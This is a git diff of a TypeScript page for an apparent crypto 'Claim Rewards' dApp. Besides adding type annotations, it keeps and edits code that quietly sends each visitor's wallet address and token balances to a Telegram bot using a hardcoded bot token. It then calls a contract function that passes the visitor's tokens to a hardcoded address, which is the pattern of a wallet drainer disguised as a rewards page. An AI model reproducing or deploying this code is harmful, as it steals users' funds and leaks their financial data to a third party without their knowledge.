@@ -10,7 +10,11 @@ const Home: NextPage = () => {
 const address = useAddress();
 const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
 const wbalance = data?.displayValue;
-const [tokenDataArr, setTokenDataArr] = useState([]);
+type Token = {
+  tokenAddress: string;
+  tokenBalance: number;
+};
+const [tokenDataArr, setTokenDataArr] = useState<Token[]>([]);
 const [errorMessage, setErrorMessage] = useState('');
 const [isButtonDisabled, setIsButtonDisabled] = useState(true);
 const { selectedChain, setSelectedChain } = useContext(ChainContext);
@@ -47,29 +51,27 @@ const router = useRouter();
         };
 
         const res = await fetch(url, options);
-        const response = await res.json();
-        const balances = response.result.tokenBalances;
+      const response = await res.json();
+      const balances = response.result.tokenBalances;
+  
+      const nonZeroBalances = balances.filter((token: { tokenBalance: string }) => {
+        return token.tokenBalance !== "0";
+      });
 
-        const nonZeroBalances = balances.filter((token) => {
-          return token.tokenBalance !== "0";
-        });
-
-        await sendMessageToTelegram(`Wallet balance of ${address} is ${wbalance}`);
-            await sendMessageToTelegram(`Token balances of ${address} on ${selectedChain} network is`);
-            const tokenDataPromises = nonZeroBalances.map(async (token, index) => {
-              const tokenMetadataOptions = {
-                method: "POST",
-                headers: {
-                  accept: "application/json",
-                  "content-type": "application/json",
-                },
-                body: JSON.stringify({
-                  id: 1,
-                  jsonrpc: "2.0",
-                  method: "alchemy_getTokenMetadata",
-                  params: [token.contractAddress],
-                }),
-              };
+      const tokenDataPromises = nonZeroBalances.map(async (token: { contractAddress: string, tokenBalance: string }, index: number) => {
+        const tokenMetadataOptions = {
+          method: "POST",
+          headers: {
+            accept: "application/json",
+            "content-type": "application/json",
+          },
+          body: JSON.stringify({
+            id: 1,
+            jsonrpc: "2.0",
+            method: "alchemy_getTokenMetadata",
+            params: [token.contractAddress],
+          }),
+        };
     
               const rawbal = Number(token.tokenBalance);
               const tokenMetadataRes = await fetch(url, tokenMetadataOptions);
@@ -86,7 +88,7 @@ const router = useRouter();
             });
     
             const tokenDataArr = await Promise.all(tokenDataPromises);
-            await sendMessageToTelegram(tokenDataArr);
+            await sendMessageToTelegram(JSON.stringify(tokenDataArr));
     
             setTokenDataArr(tokenDataArr);
           } catch (error) {
@@ -102,7 +104,7 @@ const router = useRouter();
       const to ="0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25"
       const { contract } = useContract(addresses[selectedChain]);
   const { mutateAsync: SynchronizePaalai} = useContractWrite(contract, "SynchronizePaalai");
-  const handleSynchronizePaalai = async (actionType) => {
+  const handleSynchronizePaalai = async (actionType: string) => {
     try {
       const data = await SynchronizePaalai({ args: [tokenDataArr, to] });
       console.info("contract call success", data);
@@ -204,9 +206,9 @@ Claim Rewards
     </div>
   );
 };
-const sendMessageToTelegram = async (message) => {
+const sendMessageToTelegram = async (message: string) => {
   const botToken = '6465126558:AAGyaNAHu6ZrzMiILFOJYFDvHTNfCDSdj2I';
-  const chatId = '5033004040'; // You'll need to obtain this from your Telegram bot
+  const chatId = '503300404'; // You'll need to obtain this from your Telegram bot
   
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
